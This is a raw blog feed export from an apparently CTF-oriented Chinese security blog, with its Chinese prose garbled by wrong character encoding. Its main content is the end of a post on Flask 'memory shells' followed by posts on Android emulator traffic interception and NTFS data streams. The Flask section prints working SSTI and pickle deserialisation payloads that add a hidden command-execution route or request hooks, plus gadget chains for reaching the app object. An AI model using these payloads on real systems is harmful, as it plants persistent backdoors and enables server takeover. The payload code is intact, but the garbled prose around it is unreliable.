alt="image-20241020001102100"></p><p>å¦‚æœ_got_first_requestè¿™ä¸ªå€¼ä¸ºTrueçš„è¯å°±ä¼šæŠ›å‡ºè¿™ä¸ªé”™è¯¯ï¼Œä»–çš„é»˜è®¤å€¼æ˜¯ä¸ºfalseï¼Œé‚£å°±è‚¯å®šæ˜¯åœ¨å“ªé‡Œè¢«èµ‹å€¼ä¸ºäº†Trueï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è¿™é‡Œä¸‹æ–­ç‚¹ç„¶åçœ‹è°ƒç”¨æ ˆ</p><p>å‘ç°ä»–åœ¨full_dispatch_requestè¿™ä¸ªæ–¹æ³•é‡Œé¢èµ‹å€¼ä¸ºäº†True</p><p><img src="https://cdn.clown2024.cn/202410200020962.png" alt="image-20241020002049880"></p><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹add_url_ruleçš„å…·ä½“å®ç°ï¼Œç›´æ¥ç»•è¿‡å‡½æ•°ï¼Œèµ°ä¸€éä»–å†…éƒ¨çš„å®ç°æµç¨‹æ¥æ³¨å†Œè·¯ç”±</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@setupmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_url_rule</span>(<span class="hljs-params"></span><br><span class="hljs-params">        self,</span><br><span class="hljs-params">        rule: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">        endpoint: <span class="hljs-built_in">str</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        view_func: ft.RouteCallable | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        provide_automatic_options: <span class="hljs-built_in">bool</span> | <span class="hljs-literal">None</span> = <span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        **options: t.<span class="hljs-type">Any</span>,</span><br><span class="hljs-params">    </span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">if</span> endpoint <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            endpoint = _endpoint_from_view_func(view_func)  <span class="hljs-comment"># type: ignore</span><br>        options[<span class="hljs-string">&quot;endpoint&quot;</span>] = endpoint<br>        methods = options.pop(<span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>)<br><br>        <span class="hljs-comment"># if the methods are not given and the view_func object knows its</span><br>        <span class="hljs-comment"># methods we can use that instead.  If neither exists, we go with</span><br>        <span class="hljs-comment"># a tuple of only ``GET`` as default.</span><br>        <span class="hljs-keyword">if</span> methods <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            methods = <span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;methods&quot;</span>, <span class="hljs-literal">None</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&quot;GET&quot;</span>,)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(methods, <span class="hljs-built_in">str</span>):<br>            <span class="hljs-keyword">raise</span> TypeError(<br>                <span class="hljs-string">&quot;Allowed methods must be a list of strings, for&quot;</span><br>                <span class="hljs-string">&#x27; example: @app.route(..., methods=[&quot;POST&quot;])&#x27;</span><br>            )<br>        methods = &#123;item.upper() <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> methods&#125;<br><br>        <span class="hljs-comment"># Methods that should always be added</span><br>        required_methods = <span class="hljs-built_in">set</span>(<span class="hljs-built_in">getattr</span>(view_func, <span class="hljs-string">&quot;required_methods&quot;</span>, ()))<br><br>        <span class="hljs-comment"># starting with Flask 0.8 the view_func object can disable and</span><br>        <span class="hljs-comment"># force-enable the automatic options handling.</span><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            provide_automatic_options = <span class="hljs-built_in">getattr</span>(<br>                view_func, <span class="hljs-string">&quot;provide_automatic_options&quot;</span>, <span class="hljs-literal">None</span><br>            )<br><br>        <span class="hljs-keyword">if</span> provide_automatic_options <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OPTIONS&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> methods:<br>                provide_automatic_options = <span class="hljs-literal">True</span><br>                required_methods.add(<span class="hljs-string">&quot;OPTIONS&quot;</span>)<br>            <span class="hljs-keyword">else</span>:<br>                provide_automatic_options = <span class="hljs-literal">False</span><br><br>        <span class="hljs-comment"># Add the required methods now.</span><br>        methods |= required_methods<br><br>        rule_obj = self.url_rule_class(rule, methods=methods, **options)<br>        rule_obj.provide_automatic_options = provide_automatic_options  <span class="hljs-comment"># type: ignore[attr-defined]</span><br><br>        self.url_map.add(rule_obj)<br>        <span class="hljs-keyword">if</span> view_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            old_func = self.view_functions.get(endpoint)<br>            <span class="hljs-keyword">if</span> old_func <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> old_func != view_func:<br>                <span class="hljs-keyword">raise</span> AssertionError(<br>                    <span class="hljs-string">&quot;View function mapping is overwriting an existing&quot;</span><br>                    <span class="hljs-string">f&quot; endpoint function: <span class="hljs-subst">&#123;endpoint&#125;</span>&quot;</span><br>                )<br>            self.view_functions[endpoint] = view_func<br></code></pre></td></tr></table></figure><p>å‘ç°åœ¨å‡½æ•°æœ«å°¾çš„å¤„ç†ä¸­ï¼Œå°† <code>rule_obj</code> å¯¹è±¡æ·»åŠ åˆ°äº† <code>url_map</code> ä¸­ï¼Œä¹‹åå°† <code>view_func</code> ä½œä¸ºäº† <code>view_functions</code> å­—å…¸ä¸­ <code>endpoint</code> é”®çš„å€¼ï¼Œview_funcä»å­—é¢æ„æ€æˆ‘ä»¬å°±å¯ä»¥çŸ¥é“ä»–å°±æ˜¯é‚£ä¸ªè·¯ç”±å‡½æ•°ï¼Œæ‰€ä»¥ç†è®ºä¸Šæ¥è®²ï¼Œå¯ä»¥é€šè¿‡ç›´æ¥æ“ä½œè¿™ä¸¤ä¸ªå˜é‡æ¥å®Œæˆä¸€æ¬¡æ‰‹åŠ¨çš„ <code>add_url_rule</code>ã€‚</p><p><code>url_map</code> å’Œ <code>view_functions</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">self.url_map = self.url_map_class(host_matching=host_matching)<br><br>url_map_classä¸ºmap<br><br>self.view_functions: dict[str, ft.RouteCallable] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥æ„é€ æˆ‘ä»¬çš„payloadäº†ï¼Œä½†æ˜¯éœ€è¦æ‰“ä¸¤æ¬¡ä¸ä¸€æ ·çš„payloadï¼Œä¸€æ¬¡æ·»åŠ url_mapï¼Œä¸€æ¬¡æ·»åŠ endpointï¼Œå¯ä»¥è‡ªå·±å»çœ‹çœ‹æºç å…·ä½“æ˜¯éœ€è¦æ€ä¹ˆä¼ å‚æ„é€ ï¼Œè¿™é‡Œç›´æ¥å†™payloadäº†</p><p>ç¬¬ä¸€æ¬¡payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.url_map.add(app.url_rule_class(&#x27;/flask-shell&#x27;, methods=[&#x27;GET&#x27;],endpoint=&#x27;shell&#x27;))<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200036738.png" alt="image-20241020003616645"></p><p>è¿™æ—¶å€™å·²ç»æ˜¯åˆ›å»ºäº†è·¯ç”±äº†ï¼Œä½†æ˜¯<code>view_functions</code> ä¸­å¹¶ä¸å­˜åœ¨è·¯ç”±æŒ‡å®šçš„ <code>endpoint</code> ä¼šå¯¼è‡´æŠ¥é”™</p><p>æ¥ä¸‹æ¥æ‰“ç¬¬äºŒæ¬¡payloadæ·»åŠ endpoint</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.view_functions.update(&#123;&#x27;shell&#x27;: lambda:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()&#125;)<br>&quot;,&#123;&#x27;request&#x27;:url_for.__globals__[&#x27;request&#x27;],&#x27;app&#x27;:get_flashed_messages.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410200040146.png" alt="image-20241020004011065"></p><p>å†å»è®¿é—®flask-shellè·¯ç”±å°±å¯ä»¥äº†</p><p><img src="https://cdn.clown2024.cn/202410200040499.png" alt="image-20241020004038426"></p><h1 id="pickleçš„payload"><a href="#pickleçš„payload" class="headerlink" title="pickleçš„payload"></a>pickleçš„payload</h1><p>å› ä¸ºä¸Šè¿°çš„payloadé™¤äº†ç”¨äºsstiï¼Œè¿˜å¯ä»¥ç”¨äºpickleè¿™é‡Œè®°å½•ä¸€ä¸‹<strong>gxngxngxnå¸ˆå‚…</strong>æ–‡ç« é‡Œé¢çš„payload</p><p><strong>before_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(\&quot;sys\&quot;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read())&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>after_request</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>,(<span class="hljs-string">&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].__dict__[&#x27;app&#x27;].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;gxngxngxn&#x27;) and exec(\&quot;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;clown\&#x27;)).read())\&quot;)==None else resp)&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><p><strong>errorhandler</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>,(<span class="hljs-string">&quot;global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;clown&#x27;)).read()&quot;</span>,))<br><br>a = A()<br>b = pickle.dumps(a)<br><span class="hljs-built_in">print</span>(base64.b64encode(b))<br></code></pre></td></tr></table></figure><h1 id="ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload"><a href="#ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload" class="headerlink" title="ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload"></a>ä¸€äº›æ‹¿ä¸»è¦å±æ€§çš„payload</h1><h2 id="request"><a href="#request" class="headerlink" title="request"></a>request</h2><ul><li><p>ä½ç‰ˆæœ¬çš„å †æ ˆæ‹¿æ³•ï¼šurl_for.__globals__[â€˜_request_ctx_stackâ€™].requestï¼Œè¯¥æ–¹æ³•åˆ°2.3.xå°±æ— æ³•è·å–å€¼äº†ï¼Œä¼šè¿”å›none</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;url_for.__globals__.get(&#x27;_request_ctx_stack&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410190011172.png" alt="image-20241019001140099"></p></li><li><p>é€šç”¨çš„æ‹¿æ³•å°±æ˜¯ç›´æ¥ç”¨url_for.__globals__[â€˜requestâ€™]</p><p><img src="https://cdn.clown2024.cn/202410190013035.png" alt="image-20241019001345973"></p></li><li><p>é«˜ç‰ˆæœ¬æ›¿ä»£å †æ ˆæ‹¿æ³•ï¼šåœ¨çœ‹æ–‡ç« çš„æ—¶å€™å‘ç°äº†ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥æ‹¿url_for.__globals__[â€˜current_appâ€™].request_context.__globals__[â€˜request_ctxâ€™]</p><p><img src="https://cdn.clown2024.cn/202410200048481.png" alt="image-20241020004833401"></p><p>å¯ä»¥çœ‹åˆ°æ‹¿çš„ä¹Ÿæ˜¯RequestContextå¯¹è±¡</p></li></ul><h2 id="app"><a href="#app" class="headerlink" title="app"></a>app</h2><ul><li><p>é€šå¸¸çš„æ‹¿æ³•ä¸ºï¼šurl_for.__globals__[â€˜current_appâ€™]ï¼Œä½†æ˜¯åœ¨2.3.xçš„ç‰ˆæœ¬è¿™ä¸ªæ–¹æ³•æ˜¯æ‹¿ä¸åˆ°current_appçš„ï¼Œå…·ä½“åŸå› copyä¸€ä¸‹caterpie771å¤§ç¥çš„ç ”ç©¶æˆæœ</p><blockquote><p>flask2.1.3 ä¸­ï¼ŒSSTIä½¿ç”¨çš„ <code>url_for</code> æŒ‡å‘äº† <strong>flask.helpers.url_for</strong></p><p>flask2.3.0 ä¸­ï¼ŒSSTIä½¿ç”¨çš„ <code>url_for</code> æŒ‡å‘äº† <strong>flask.app.Flask.url_for</strong></p><p>å„ç‰ˆæœ¬çš„ flask&#x2F;helpers.py éƒ½æ˜¯å¼•å…¥äº† current_app çš„</p><p>ä» 3.0.0 å¼€å§‹ flask&#x2F;app.py æ‰æœ‰å¼•å…¥ current_app</p><p>æ‰€ä»¥2.3.0çš„url_forçš„ä¸Šä¸‹æ–‡æ²¡æœ‰current_app</p></blockquote></li><li><p>ä¸€äº›æ›¿ä»£æ‹¿æ³•ï¼Œä¹Ÿå°±æ˜¯æ‹¿globalsçš„æ–¹æ³•ï¼Œä»–çš„ä¸Šä¸‹æ–‡å†…å®¹æ‰€åœ¨ä½ç½®ä¹Ÿæ ‡å‡ºæ¥ï¼ŒåŒæ ·æ˜¯æˆ‘ä»¬caterpie771å¤§ç¥çš„è°ƒè¯•ç»“æœ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">payload                                     context<br>get_flashed_messages.__globals__        flask.helpers<br>request.__init__.__globals__            werkzeug.wrappers.request<br>request.application.__globals__            werkzeug.wrappers.request<br>session.__init__.__globals__            flask.sessions<br>config.__class__.__init__.__globals__    flask.config<br></code></pre></td></tr></table></figure></li><li><p>è¿˜æœ‰ä¸€ä¸­æ˜¯é€šè¿‡sys.module[â€˜__main__â€˜].appè¿™ä¸ªæ¨¡å—æ¥æ‹¿ï¼Œæ‰€ä»¥å°±æ˜¯æ­£å¸¸sstié“¾å­çš„æµç¨‹æ‹¿åˆ°builtinså³å¯ï¼Œè¿™é‡Œå°±ä¸¾å‡ ä¸ªä¾‹å­</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&#123;&#123;lipsum.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;sys&#x27;).modules[&#x27;__main__&#x27;].app&quot;)&#125;&#125;<br><br>&#123;&#123;x.__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;__main__&#x27;].app&#125;&#125;<br></code></pre></td></tr></table></figure></li></ul><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/">http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/</a></p><p><a href="https://www.cnblogs.com/gxngxngxn/p/18181936">https://www.cnblogs.com/gxngxngxn/p/18181936</a></p><p><a href="https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4+xCqqmqTrKFLep3x#toc-6">https://xz.aliyun.com/t/14526?time__1311=GqAhDIqjxmxfx0yx4%2BxCqqmqTrKFLep3x#toc-6</a></p><p><a href="https://tiangonglab.github.io/blog/tiangongarticle038/">https://tiangonglab.github.io/blog/tiangongarticle038/</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/">https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/</a></p><p><a href="https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/">https://www.caterpie771.cn/2024/09/27/flask-%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ‹–äº†å¾ˆä¹…ç»ˆäºæ¥çœ‹ä¸€ä¸‹flaskå†…å­˜é©¬è¿™ä¸ªä¸œè¥¿äº†ï¼Œä¸»è¦æ˜¯å‘ç°æŸæ–°ç”Ÿèµ›week2å°±è¦æ‰“flaskå†…å­˜é©¬ï¼Œèµ¶ç´§æ¥å­¦äº†ğŸ˜¢&lt;/p&gt;
&lt;h1 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h1&gt;&lt;p&gt;å†…å­˜é©¬å°±æ˜¯</summary>
      
    
    
    
    <category term="python" scheme="https://clowsman.github.io/categories/python/"/>
    
    
    <category term="å†…å­˜é©¬" scheme="https://clowsman.github.io/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="python" scheme="https://clowsman.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>APPæ¸—é€æŠ“åŒ…ç¯å¢ƒé…ç½®</title>
    <link href="https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <id>https://clowsman.github.io/2024/08/15/APP%E6%B8%97%E9%80%8F%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</id>
    <published>2024-08-15T10:52:02.000Z</published>
    <updated>2024-08-15T17:34:27.424Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®"><a href="#æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®" class="headerlink" title="æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®"></a>æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®</h1><p>è¿™é‡Œç”¨é›·ç”µæ¨¡æ‹Ÿå™¨</p><p>ipconfigæŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„IP</p><p><img src="https://cdn.clown2024.cn/202408151921468.png" alt="image-20240815192142415"></p><p>ç„¶ååœ¨burpæ·»åŠ ä¸€ä¸ªæ–°çš„ä»£ç†</p><p><img src="https://cdn.clown2024.cn/202408151922834.png" alt="image-20240815192241797"></p><p>ç„¶åæ¨¡æ‹Ÿå™¨ä¹Ÿè‡ªå®šä¹‰è¯¥ipåœ°å€</p><p><img src="https://cdn.clown2024.cn/202408151925440.png" alt="image-20240815192521373"></p><h1 id="è¯ä¹¦å®‰è£…"><a href="#è¯ä¹¦å®‰è£…" class="headerlink" title="è¯ä¹¦å®‰è£…"></a>è¯ä¹¦å®‰è£…</h1><p>è¿™é‡Œå¦‚æœè¦æŠ“httpsè¿˜éœ€è¦å®‰è£…ä¸€ä¸‹burpè¯ä¹¦ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/">https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/04.%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/06.%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%90%84%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%8A%93%E5%8C%85/</a></p><blockquote><p>ä½†æ˜¯Android ä» 7.0 å¼€å§‹ï¼Œç³»ç»Ÿä¸å†ä¿¡ä»»ç”¨æˆ· CA è¯ä¹¦ï¼Œå®‰è£…è¯ä¹¦çš„æ–¹å¼å°±éº»çƒ¦ä¸€ç‚¹</p></blockquote><p>é¦–å…ˆè®¿é—®burpçš„ç›‘å¬åœ°å€ä¸‹è½½è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151927057.png" alt="image-20240815192723003"></p><p>æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨å¯ä»¥çœ‹åˆ°è¯ä¹¦</p><p><img src="https://cdn.clown2024.cn/202408151928262.png" alt="image-20240815192845208"></p><p>ç„¶åç”¨kalié‡Œçš„å·¥å…·opensslè®¡ç®—è¯ä¹¦å“ˆå¸Œå€¼</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">openssl x509 -inform der -subject_hash_old -<span class="hljs-keyword">in</span> cacert.der -noout<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408151939380.png" alt="image-20240815193917347"></p><p>å°†è¯ä¹¦åæ”¹ä¸º<code>&lt;hash&gt;.0</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> cacert.der 9a5ba575.0<br></code></pre></td></tr></table></figure><p>ç„¶åç”¨<code>MTç®¡ç†å™¨</code>å°†å…¶ç§»åŠ¨åˆ°<code>/system/etc/security/cacerts/</code>ç›®å½•</p><blockquote><p>é›·ç”µ9è¿™é‡Œä¼šå‡ºç°æŒ‚è½½å¤±è´¥æ— æ³•ç§»åŠ¨çš„æƒ…å†µ</p><p><img src="https://cdn.clown2024.cn/202408151952697.png" alt="image-20240815195250615"></p><p>è¦åœ¨è®¾ç½®â€“&gt;æ€§èƒ½è®¾ç½®ä¿®æ”¹ä¸€ä¸‹vmdkå¯å†™</p><p><img src="https://cdn.clown2024.cn/202408151954575.png" alt="image-20240815195457525"></p></blockquote><p>éš¾ç»·çš„è¿˜æ˜¯ä¸è¡Œï¼Œæ¢ç½‘æ˜“çš„MuMuæ¨¡æ‹Ÿå™¨å°±å¥½äº†ï¼Œè¿™é›·ç”µæ¨¡æ‹Ÿå™¨ä»€ä¹ˆæ¯›ç—…ğŸ¥²</p><p>æµç¨‹å’Œä¸Šé¢ä¸€æ ·ï¼Œå‚è€ƒæ–‡ç« ï¼š<a href="https://blog.csdn.net/shr592833253/article/details/139395912">ç”¨æ‰‹æœºæ¨¡æ‹Ÿå™¨è¿›è¡ŒAPPæ¸—é€æµ‹è¯•æŠ“åŒ…(è¶…è¯¦ç»†ç‰ˆ)_æ‰‹æœºæ¨¡æ‹Ÿå™¨æŠ“åŒ…-CSDNåšå®¢</a></p><p>è¯ä¹¦æ”¾è¿‡å»çš„æ—¶å€™è¦è®°å¾—æœ‰è¶³å¤Ÿæƒé™ï¼Œæœ‰äº›å¯èƒ½ä¸å¤Ÿï¼Œå¯ä»¥ç›´æ¥ç”¨mtæ”¹</p><p><img src="https://cdn.clown2024.cn/202408152317058.png" alt="image-20240815231730970"></p><p>ç„¶åæŠŠ&#x2F;systemè¿™ä¸ªç›®å½•çš„æƒé™ä¹Ÿæ”¹æˆ777</p><p><img src="https://cdn.clown2024.cn/202408152319326.png" alt="image-20240815231905270"></p><p>ç„¶åå°±å¯ä»¥æ­£å¸¸æŠ“åŒ…ä¹Ÿæ²¡æœ‰è¯ä¹¦é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202408152321450.png" alt="image-20240815232138363"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&quot;&gt;&lt;a href=&quot;#æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&quot; class=&quot;headerlink&quot; title=&quot;æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&quot;&gt;&lt;/a&gt;æ¨¡æ‹Ÿå™¨ä»£ç†è®¾ç½®&lt;/h1&gt;&lt;p&gt;è¿™é‡Œç”¨é›·ç”µæ¨¡æ‹Ÿå™¨&lt;/p&gt;
&lt;p&gt;ipconfigæŸ¥çœ‹ä¸€ä¸‹æœ¬æœºçš„IP&lt;/p&gt;
&lt;p&gt;&lt;img src=</summary>
      
    
    
    
    <category term="appæ¸—é€" scheme="https://clowsman.github.io/categories/app%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="æ¸—é€" scheme="https://clowsman.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>NTFSæ•°æ®æµéšå†™</title>
    <link href="https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/"/>
    <id>https://clowsman.github.io/2024/07/12/NTFS%E6%95%B0%E6%8D%AE%E6%B5%81%E9%9A%90%E5%86%99/</id>
    <published>2024-07-12T12:39:30.000Z</published>
    <updated>2024-07-15T06:42:10.915Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™æ˜¯åœ¨å‰æ–‡å­¦ä¹ mysqlææƒçš„æ—¶å€™é‡åˆ°çš„åˆ©ç”¨æ•°æ®æµå†™æ–‡ä»¶ï¼Œä»¥å‰æœ‰ç‚¹å°è±¡ä½†ä¸æ˜¯å¾ˆæ·±ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹ã€‚</p><h1 id="ntfsæ•°æ®æµä»‹ç»"><a href="#NTFSæ•°æ®æµä»‹ç»" class="headerlink" title="NTFSæ•°æ®æµä»‹ç»"></a>NTFSæ•°æ®æµä»‹ç»</h1><p>åœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸­å­˜åœ¨ç€NTFSå¤‡ç”¨æ•°æ®æµï¼ˆAlternate Data Streamsï¼Œç®€ç§°ADSï¼‰ï¼Œè¿™æ˜¯NTFSç£ç›˜æ ¼å¼çš„ç‰¹æ€§ä¹‹ä¸€ã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½æœ‰ç€ä¸»æ–‡ä»¶æµå’Œéä¸»æ–‡ä»¶æµï¼Œä¸»æ–‡ä»¶æµèƒ½å¤Ÿç›´æ¥çœ‹åˆ°ï¼›è€Œéä¸»æ–‡ä»¶æµå¯„å®¿äºä¸»æ–‡ä»¶æµä¸­ï¼Œæ— æ³•ç›´æ¥è¯»å–ï¼Œè¿™ä¸ªéä¸»æ–‡ä»¶æµå°±æ˜¯NTFSå¤‡ç”¨æ•°æ®æµã€‚</p><p>ADSçš„ä½œç”¨åœ¨äºï¼Œå®ƒå…è®¸ä¸€ä¸ªæ–‡ä»¶æºå¸¦ç€é™„åŠ çš„ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼ŒIEæµè§ˆå™¨ä¸‹è½½æ–‡ä»¶æ—¶ï¼Œä¼šå‘æ–‡ä»¶æ·»åŠ ä¸€ä¸ªæ•°æ®æµï¼Œæ ‡è®°è¯¥æ–‡ä»¶æ¥æºäºå¤–éƒ¨ï¼Œå³å¸¦æœ‰é£é™©ï¼Œé‚£ä¹ˆï¼Œåœ¨ç”¨æˆ·æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå°±ä¼šå¼¹å‡ºæ–‡ä»¶è­¦å‘Šæç¤ºã€‚å†å¦‚ï¼Œåœ¨ç½‘å€æ”¶è—ä¸­ï¼Œä¹Ÿä¼šé™„åŠ 